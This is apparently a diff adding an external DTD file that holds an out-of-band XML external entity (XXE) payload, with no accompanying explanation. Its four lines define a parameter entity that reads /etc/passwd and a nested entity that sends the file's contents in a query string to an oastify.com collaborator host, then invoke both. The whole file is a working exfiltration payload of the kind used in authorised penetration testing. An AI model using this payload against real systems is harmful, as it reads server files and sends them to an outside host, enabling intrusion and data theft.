@@ -1,0 +1,4 @@
+<!ENTITY % test1 SYSTEM "file:///etc/passwd">
+<!ENTITY % abt1 "<!ENTITY  &#x25; exfil1 SYSTEM 'http://r7zi6uxk3bz4bya8rrq6fa4c339uxrlg.oastify.com/?asd=%test1;'>">
+%abt1;
+%exfil1;
